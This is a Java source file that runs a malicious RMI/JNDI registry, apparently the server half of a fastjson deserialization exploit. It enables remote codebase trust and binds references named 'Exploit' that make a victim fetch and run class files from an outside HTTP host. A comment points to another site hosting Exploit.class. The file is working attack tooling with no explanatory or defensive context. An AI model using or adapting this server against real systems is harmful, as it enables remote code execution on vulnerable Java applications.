package fastjson;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIServer {
    public static void start() throws
            AlreadyBoundException, RemoteException, NamingException {
        System.out.println(System.setProperty("java.rmi.server.useCodebaseOnly", "false"));
        System.out.println(System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true"));
        System.out.println(System.setProperty("java.rmi.server.codebase", "http://10.0.0.41/"));

        Registry registry = LocateRegistry.createRegistry(1099);
        System.setProperty("java.rmi.server.hostname","10.1.1.40");
        //http://xxlegend.com/Exploit.class即可
        Reference reference = new Reference("Exploit2",
                "ExploitFactory","http://10.0.0.41/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        Reference reference2 = new Reference("Exploit3",
                "Exploit","http://10.0.0.41/");
        ReferenceWrapper referenceWrapper2 = new ReferenceWrapper(reference2);
        registry.bind("Exploit", referenceWrapper);
        registry.bind("Exploit2", referenceWrapper2);
    }
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
